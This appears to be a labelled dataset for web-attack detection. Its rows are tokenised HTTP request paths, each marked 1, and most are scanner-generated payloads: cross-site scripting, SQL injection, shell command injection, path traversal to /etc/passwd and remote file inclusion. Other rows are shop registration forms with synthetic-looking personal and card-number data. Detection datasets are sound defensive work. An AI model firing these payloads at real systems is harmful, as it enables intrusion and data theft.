sentences 	 labels
/ 8x6w469u . jsp ?  < script > document . cookie =  " testgfjr = 1286 ;  "  <  ?  < script > document . cookie =  " testgfjr = 1286 ;  "  <  / script >  	 1
/ string & strings & parameters = -5009 )  where 8463 = 8463 union all select 8463 , 8463 , 8463 , 8463 , 8463 , 8463 --  	 1
/ string & strings & parameters = 1 "  "  )  and sleep ( 5 )  and  (  "  " ytof "  "  =  "  " ytof  	 1
/ string & strings & parameters = |   [  8 -ne  $  ( echo pfmsxe  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ main . php ? logout =  "  & rm \ x09q79499365 \ x09 #? logout =  "  & rm \ x09q79499365 \ x09 #  	 1
/ string & strings & parameters = 1 )  as ewnv where 3393 = 3393 and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  	 1
/ 1qwv2p5p . exe ?  < meta http-equiv = set-cookie content =  " testvqcy = 252 "  >?  < meta http-equiv = set-cookie content =  " testvqcy = 252 "  >  	 1
/ string & id = 1 & nombre = and + 1 = 1 & precio = 85 & cantidad = 65 & b1 = aadir + al + carrito  	 1
/ string & modo = insertar & precio = 4689 & b1 = confirmar &  	 1
/ string & strings & parameters = < a class = bar href =  " http :  &  & www . example . org "  > www . example . org <  & a >  	 1
/ manager & btdownload . php ? type = torrent & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & modo = registro & login = maryann & password = comadrear & nombre = rosmida & apellidos = f ? erraron + ortegn & email = balgobin_rosener @ freemachine . mk & dni = 61907460q & direccion = calzada + de + san + pedro + 118 +  & ciudad = viso ,  + el & cp = 17199 & provincia = asturias & ntc = 5287078269282074 & b1 = registrar  	 1
/ string & str =  $  ( echo huzgzz )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  &  	 1
/ main . php ? logout =  " ver ;  > q16377729 & rem ;? logout =  " ver ;  > q16377729 & rem ;  	 1
/ zabbix & frontends & php & locales . php ? download = 1 & langto = 1 & extlang [  "  . system (  '  / bin / echo + -en +  "  \ 0174 \ 0044 \ 0000 \ 0377 \ 0347 "  +  >  >  +  / tmp / xvvpghsokp0 ;  '  )  .  "  ]  = 1  	 1
/ string & strings & parameters = 1 %  '  )  )  )  union all select null , null , null , null , null , null , null , null , null , null #  	 1
/ 0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c { file }  	 1
/ string & strings & parameters = < xml id =  "  " x "  "  >  < a >  < b >  < script > document . cookie = true ;  <  & script >  ;  <  & b >  <  & a >  <  & xml >  	 1
/ javascript & cpanel . exe  	 1
/ includes & global . php ? nbs = xxpathxx ?  	 1
/ betablockmodules & uploadmediamodule & uploadmediamodule . php ? current_blockmodule_path = xxpathxx  	 1
/ string & strings & parameters = 1 '  +  ( select nash where 4159 = 4159 union all select null #  	 1
/ string & strings & parameters = 1 '  )  )  ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  --  	 1
/ string & modo = registro & login = morgan-c & password = ventera & nombre = abdel & apellidos = gortari & email = ericsson @ lalectura . gr & dnia = 93062910b & direccion = c &  + barlovento ,  + 111 ,  + 5 ? h & ciudad = amurrio & cp = 25289 & provincia = guipzcoa & ntc = 8608089924764976 & b1 = registrar  	 1
/ examples & servlets & servlet & check_user_id . php ? user_id =  < script > foo <  / script >  	 1
/ string & errormsg = credenciales + incorrectas '  + and +  ' 1 '  =  ' 1  	 1
/ main . php ? stuff =  '  \ x0adel \ x09q88589696 \ x09 #? stuff =  '  \ x0adel \ x09q88589696 \ x09 #  	 1
/ edv3mapy . exe ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ help . php ? q =  " ping , -w , 10000 , -n , 1 , 4 . 3 . 2 . 1 & rem ,? q =  " ping , -w , 10000 , -n , 1 , 4 . 3 . 2 . 1 & rem ,  	 1
/ string & strings & parameters = 1 "  "  )  as yecj where 1194 = 1194 and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 1
/ 82q7ywa8 . x ?  < meta http-equiv = set-cookie content =  " testpwew = 1315 "  >?  < meta http-equiv = set-cookie content =  " testpwew = 1315 "  >  	 1
/ string & modo = registro & login = arne & password = arenilla & nombre = malaquas & apellidos = bota + gifre & email = herdegen-vehil @ cortinas-de-aire . ar & dni = 38384259l @ 40 & direccion = c &  + sabugo ,  + 157 ,  +  & ciudad = valdevacas + de + montejo & cp = 26339 & provincia = tarragona & ntc = 6852146150685245 & b1 = registrar  	 1
/ string & strings & parameters = '  |   [  3 -ne  $  ( echo sbhmiy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/  & q47719336 &  # 38 ; q1431 &  # 34 ; q1431 &  # 60 ; q1431 &  # 62 ; q47719336  	 1
/ examples & jsp & jsp2 & el & help & index . php ? help_file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = '  | echo $ ifsxrlzpa $  (  ( 20 + 95 )  )  $  ( echo $ ifsxrlzpa ) xrlzpa "  	 1
/ string & modo = entrar & login = thisner9 & pwd =  < script > alert (  " paros "  )  ;  <  & script >  & remember = off & b1 = entrar  	 1
/ includes & class & class_tpl . php ? cache_file = xxpathxx ?  	 1
/ string & strings & parameters = "  | echo aithiz $  (  ( 84 + 6 )  )  $  ( echo aithiz ) aithiz \  \  	 1
/ phpmyadmin &  &  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ etc & passwd  	 1
/ string & strings & parameters = 1 "  "  )  as htyo where 8322 = 8322 and 4595 = 4595 #  	 1
/ main . php ? stuff =  "  \ x0dsleep \ x098 \ x09 #? stuff =  "  \ x0dsleep \ x098 \ x09 #  	 1
/ string & strings & parameters = < meta http-equiv = set-cookie content =  " testpwew = 1315 "  >  	 1
/ string & strings & parameters = < xss >  < script > alert (  ' xss '  )  <  & script >  <  & vulnerable >  	 1
/ help . php ? q =  "  \ x0arm q73214822  #? q =  "  \ x0arm q73214822  #  	 1
/ string & modo = entrar & login = bateman & pwd =  , 6 & c62pa1ad ' 7 & remember = on & b1 = entrar  	 1
/ string & strings & parameters = < script > x =  "  "  & prompt ( 9 )  &  "  "  ; y = 42 ;  <  & script >  	 1
/ scripts & mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331919012 , 4 --  & blog = 1  	 1
/ string & strings & parameters = 1 "  "  )  )  and 8514 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  and  (  (  "  " gxqq "  "  =  "  " gxqq  	 1
/ en-us & 33y9gcqq . cgi ?  < meta http-equiv = set-cookie content =  " testnvxc = 4301 "  >  	 1
/ string & strings & parameters = ; echo ktebys $  (  ( 87 + 50 )  )  $  ( echo ktebys ) ktebys "  	 1
/ string & strings & parameters = echo $ ifsagopuq $  (  ( 42 + 10 )  )  $  ( echo $ ifsagopuq ) agopuq |  	 1
/ mv8wxfy9 . cfm ?  < script > document . cookie =  " testrhbc = 8184 ;  "  <  ?  < script > document . cookie =  " testrhbc = 8184 ;  "  <  / script >  	 1
/ cgi-bin & search . jsp ? q =  %  "  < script > alert ( 1331905049 )  <  / script >  	 1
/ string & modo = entrar & login = katina & pwd = veneciana & remember = off &  & b1 = entrar  	 1
/ string & strings & parameters = 1 %  "  "  )  )  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ cacti & a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ m5103snj . jsp ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ portfolio . php ? cat_id =  " force_sql_error? cat_id =  " force_sql_error  	 1
/ string & strings & parameters = < img src \ x11 = x onerror =  " javascript : alert ( 1 )  "  >  	 1
/ myphpnuke & links . php ? op = mostpopular & ratenum =  [ script ] alert ( document . cookie )  ;  [  / script ]  & ratetype = percent  	 1
/ string & strings & parameters = -5196 "  "  )  )  )  or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  (  (  (  "  " gbcq "  "  like  "  " gbcq  	 1
/ string & modo = insertar & precio = 7988 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = confirmar  	 1
/ string & strings & parameters = -9504 %  "  "  )  )  or 8098 = 7472  	 1
/ help . php ? q =  " del \ x0cq65994111 & rem \ x0c? q =  " del \ x0cq65994111 & rem \ x0c  	 1
/ string & modo =  @ 40 & login = storm & pwd = 527ad2 & remember = off & b1 = entrar  	 1
/ string & strings & parameters = 1 )  )  )  and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  (  ( 8023 = 8023  	 1
/ 1qwv2p5p . php3 ?  < meta http-equiv = set-cookie content =  " testvqcy = 252 "  >?  < meta http-equiv = set-cookie content =  " testvqcy = 252 "  >  	 1
/ uvazfs7p . htm ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  ?  < script > document . cookie =  " testwtbo = 4831 ;  "  <  / script >  	 1
/ cgi-bin & edit_image . php ? dn = 1 & userfile =  / etc / passwd & userfile_name =   ; id ;  	 1
/ string & strings & parameters = < youremail >   cc :  < youremail >  	 1
/ string & strings & parameters = "  &  & echo ypkeuz $  (  ( 26 + 62 )  )  $  ( echo ypkeuz ) ypkeuz '  	 1
/ examples & jsp & sessions & myevent . php ? myevent_path =  / etc / passwd \ x00  	 1
/ 0z575z74 . htm ?  < meta http-equiv = set-cookie content =  " testuhsv = 9753 "  >?  < meta http-equiv = set-cookie content =  " testuhsv = 9753 "  >  	 1
/ string & strings & parameters = < a href =  "  \ x08javascript : javascript : alert ( 1 )  "  id =  " fuzzelement1 "  > test <  & a >  	 1
/ string & strings & parameters = *  (  |  ( mail =  *  )  )  	 1
/ string & strings & parameters = ;  str =  $  ( echo ewygbo )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  &  	 1
/ xarg_corner . php ? xarg = xxpathxx ?? xarg = xxpathxx ?  	 1
/ string & strings & parameters = "   str =  $  ( echo hkgdxh )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ lsoix5h3 . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 9kr0ih0v . cfc ?  < script > document . cookie =  " testzgnm = 1183 ;  "  <  ?  < script > document . cookie =  " testzgnm = 1183 ;  "  <  / script >  	 1
/ examples & jsp & checkbox & demos & demo . browse . php ? filename =  / etc / passwd  	 1
/  % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 { file }  	 1
/ string & strings & parameters = 1 ,  ( select 9100 =  (  ' qqpjq '  |  |  ( select case 9100 when 9100 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  )  	 1
/ lsoix5h3 . cfm ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ string & strings & parameters = "  |   [  8 -ne  $  ( echo ehuily  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ opensiteadmin & scripts & classes & form . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  \ x00  	 1
/ string & strings & parameters = 1 '  |  |  ( select  ' xuou '  from dual where 7681 = 7681 or extractvalue ( 1297 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 1297 = 1297 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  '  	 1
/ string & strings & parameters = ' echo $ ifsmhubah $  (  ( 13 + 52 )  )  $  ( echo $ ifsmhubah ) mhubah &  &  	 1
/ cgi-bin & alibaba . pl | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  ,  	 1
/ main . php ? stuff =  '  & uname \ x09 > q47285252 \ x09 #? stuff =  '  & uname \ x09 > q47285252 \ x09 #  	 1
/ string & strings & parameters = >  "  "  < iframe src =  "  " javascript : document . cookie = true ;  >  	 1
/ javascript & lst . exe  	 1
/ string & modo = insertar & precio = 9140 & b1 = pasar + por + caja &  	 1
/ string & strings & parameters = "  echo vflnzs $  (  ( 29 + 83 )  )  $  ( echo vflnzs ) vflnzs "  	 1
/ 3hlysl2x . cfm ?  < script > document . cookie =  " testgjbe = 8505 ;  "  <  ?  < script > document . cookie =  " testgjbe = 8505 ;  "  <  / script >  	 1
/  < meta http-equiv = set-cookie content =  " testwldz = 3506 "  >  	 1
/ yef5f3d5 . exe ?  < meta http-equiv = set-cookie content =  " testcrcv = 6167 "  >?  < meta http-equiv = set-cookie content =  " testcrcv = 6167 "  >  	 1
/ javascript & title . exe  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo zyjhac )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 1
/ cgi-bin & vq & demos & respond . pl ?  < script > alert (  ' vulnerable '  )  <  / script >  	 1
/ scripts & rss . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  	 1
/ string & strings & parameters = 1 '  )  )  as kfnt where 8090 = 8090 procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  --  	 1
/ cgi-bin & search . php ? searchstring =  < script > foo <  / script >  	 1
/ ybz5rz7a . dll ?  < script > document . cookie =  " testsbvw = 6289 ;  "  <  ?  < script > document . cookie =  " testsbvw = 6289 ;  "  <  / script >  	 1
/ string & strings & parameters = 1 '  |  |  ( select  ' dajl '  from dual where 8440 = 8440 ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 --  	 1
/ fnwhrxyd . html ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = 1 )  )  )  union all select null , null , null , null , null , null --  	 1
/  < meta http-equiv = set-cookie content =  " testxeoi = 3573 "  >  	 1
/ string & strings & parameters = -3963 "  "  or 1224 = 5119  	 1
/ string & strings & parameters = 1 where 2146 = 2146 or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  --  	 1
/ zln2hm2z . cgi ?  < script > document . cookie =  " testblcp = 8120 ;  "  <  ?  < script > document . cookie =  " testblcp = 8120 ;  "  <  / script >  	 1
/ cgi-bin &  . cobalt & message & message . cgi ? info =  < script > alert (  ' alert '  )  ;  <  / script >  	 1
/ string & str =  $  ( echo fwggrq )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/ supasite & common_functions . php ? supa [ db_path ]  = xxpathxx  	 1
/ string & strings & parameters = ;  str =  $  ( echo jhaatd )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ cacti & sources & functions . php ? root_path =  / etc / passwd \ x00  	 1
/ string & modo = registro & login = chong & password = 2hul7do & nombre = loreto & apellidos = torrelli + casares & email = bog @ paremoselalzheimer . is & dni = 03582434t & direccion =  + c &  + arq *  * uitectura + s & n +  & ciudad = odn & cp = 25135 & provincia = madrid & ntc = 1689148382896192 & b1 = registrar  	 1
/ string & strings & parameters = '  ;  str =  $  ( echo dhyuhh )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  #  	 1
/ string & strings & parameters = 1 '  and char ( 111 )  |  | char ( 77 )  |  | char ( 121 )  |  | char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  and  ' jjxn '  =  ' jjxn  	 1
/ news . php ? config [ root_ordner ]  = xxpathxx ?  & cmd = id? config [ root_ordner ]  = xxpathxx ?  & cmd = id  	 1
/ string & strings & parameters = "  |   [  1 -ne  $  ( echo crooyg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 1
/ rv98iwjp . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo ogqlys )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  "  	 1
/ string & id = bob @  < script > alert ( paros )  <  & script >  . parosproxy . org  	 1
/ cgibin & pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = < a href =  "  "  onclick =  `  `  & name =  = alert ( 1 )  > clickme <  & a >  	 1
/ string & strings & parameters = 1 %  '  )  )  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  and  (  (  (  '  %  '  =  '  	 1
/ string & id =  ' or ' a =  ' a  	 1
/ string & strings & parameters = 1 "  "  )  )  )  ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  #  	 1
/ uc3w3bdi . do ?  < meta http-equiv = set-cookie content =  " testxllt = 9940 "  >?  < meta http-equiv = set-cookie content =  " testxllt = 9940 "  >  	 1
/ string & strings & parameters = ; echo $ ifsrhwtna $  (  ( 89 + 71 )  )  $  ( echo $ ifsrhwtna ) rhwtna  	 1
/ string & strings & parameters = 1 '  |  |  ( select  ' gikt '  where 8447 = 8447 or 1022 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 1
/ string & strings & parameters = & echo $ ifsrovzmd $  (  ( 87 + 57 )  )  $  ( echo $ ifsrovzmd ) rovzmd \  \  	 1
/ string & strings & parameters = if ( 1 !  = 1 , 1 , sleep ( 5 )  )  --  +  	 1
/ string & strings & parameters = ;  str =  $  ( echo mjszol )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  &  	 1
/ string & strings & parameters = | echo bhrxbc $  (  ( 7 + 14 )  )  $  ( echo bhrxbc ) bhrxbc "  	 1
/ string & strings & parameters = echo pzdgkf $  (  ( 44 + 50 )  )  $  ( echo pzdgkf ) pzdgkf &  	 1
/ examples & jsp & colors & phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904365 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  	 1
/ 3j8echh0 . asp ?  < script > document . cookie =  " testfuqi = 4189 ;  "  <  ?  < script > document . cookie =  " testfuqi = 4189 ;  "  <  / script >  	 1
